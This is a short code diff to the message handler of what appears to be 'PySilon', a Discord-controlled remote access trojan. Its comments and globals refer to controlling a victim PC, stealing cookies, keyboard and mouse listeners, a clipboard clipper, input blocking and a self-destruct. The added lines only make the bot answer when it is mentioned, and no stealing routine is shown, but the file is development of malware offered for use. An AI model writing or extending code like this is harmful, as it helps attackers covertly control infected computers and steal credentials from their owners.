@@ -361,6 +361,10 @@ async def on_message(message):
     global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, clipper_stop, input_blocked
     #.log New message logged
     if message.author != client.user:
+        if message.content == f'<@{client.user.id}>':
+            #.log Author mentioned PySilon BOT
+            await client.get_channel(channel_ids['main']).send(f'<@{message.author.id}>')
+            #.log Sent message with mention of Author
         #.log Author is not a BOT
         if message.channel.id in channel_ids.values():
             #.log Message channel is controlling this PC
